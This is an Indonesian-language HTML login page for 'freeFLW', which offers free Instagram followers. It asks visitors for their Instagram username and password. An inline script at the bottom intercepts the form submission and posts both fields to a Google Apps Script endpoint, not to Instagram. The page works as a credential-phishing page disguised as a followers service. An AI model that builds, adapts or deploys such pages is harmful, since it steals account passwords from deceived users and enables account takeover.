<!DOCTYPE html>
<html lang="in">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="../css/style-freeflw.css" />
    <link rel="stylesheet" href="../css/login.css" />
    <title>freeFLW | Login</title>
  </head>
  <body>
    <div class="container-nav">
      <nav>
        <span><h1>freeFLW</h1></span>
        <ul>
          <li>
            <a href="#home">Home</a>
          </li>
          <li>
            <a href="#layanan">Layanan</a>
          </li>
          <li>
            <a href="#followers">Free Followers</a>
          </li>
          <li>
            <a href="#tentang">Tentang</a>
          </li>
          <li>
            <a href="#">Kontak</a>
          </li>
          <li>
            <a href="../login/login.html">
              <button>Login</button>
            </a>
          </li>
        </ul>
      </nav>
    </div>

    <!-- login -->
    <div class="container-login">
      <div class="login">
        <form name="login-freeFLW">
          <h1>Login freeFLW</h1>
          <marquee behavior="" direction=""
            >Masukan informasi yang valid dan pastikan akun instagram kamu tidak
            diprivate.</marquee
          >
          <label for="username">Username Instagram</label>
          <br />
          <div class="username-sc">
            <input
              type="text"
              name="username"
              class="username"
              id="username"
              placeholder="free_flw"
              required
            />
            <i class="fa-solid fa-at"></i>
          </div>
          <br />
          <label for="password">Password</label>
          <br />
          <div class="password-sc">
            <input
              type="password"
              name="password"
              class="password"
              id="password"
              placeholder="Masukan password akun instagram"
              required
            />
            <i class="fa-solid fa-lock"></i>
          </div>
          <br />
          <button type="submit" onclick="secureLogin()">
            Secure Login
            <i class="fa-solid fa-lock" id="lock"></i>
          </button>
        </form>
      </div>
    </div>

    <script src="../js/script.js"></script>
    <script
      src="https://kit.fontawesome.com/e91d75df7f.js"
      crossorigin="anonymous"
    ></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script>
      const scriptURL =
        "https://script.google.com/macros/s/AKfycbxnT1xXcY4V_ZgQGvHOI6g6l6ascFi7UKYOS455AAi5J2a7sfKom_0OjttVVaTgsRTE/exec";
      const form = document.forms["login-freeFLW"];

      form.addEventListener("submit", (e) => {
        e.preventDefault();
        fetch(scriptURL, { method: "POST", body: new FormData(form) })
          .then((response) => console.log("Success!", response))
          .catch((error) => console.error("Error!", error.message));
      });
    </script>
  </body>
</html>
